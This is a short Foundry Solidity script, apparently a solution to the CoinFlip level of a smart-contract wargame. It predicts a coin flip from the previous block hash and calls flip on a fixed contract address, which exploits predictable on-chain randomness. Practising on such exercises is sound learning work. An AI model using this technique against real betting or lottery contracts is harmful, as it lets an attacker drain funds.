// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level3/CoinFlip.sol";

contract POC is Script {
    CoinFlip instance = CoinFlip(0xaefdaC29f6D9bb00E68c789845e4Dc2De89aDbfF);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {

        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        instance.flip(side);

        console.log("Flipped.... consecutiveWins: ", instance.consecutiveWins());
        vm.stopBroadcast();
    }
}
